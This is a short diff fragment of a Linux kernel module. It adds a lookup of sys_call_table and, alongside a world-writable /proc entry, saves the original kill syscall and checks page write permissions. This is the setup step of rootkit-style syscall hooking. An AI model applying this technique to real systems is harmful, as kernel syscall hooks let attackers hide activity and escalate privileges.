@@ -95,6 +95,8 @@ int __init m_init(void) {
 	pte_t* pte;
 	proc_create("mexe", S_IRUGO | S_IWUGO, NULL, &m_fops) ;
 
+	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
+
 	orig_sys_kill = sctable[__NR_kill];
 	pte = lookup_address((unsigned long) sctable, &level);
 	if(pte->pte &~ _PAGE_RW)
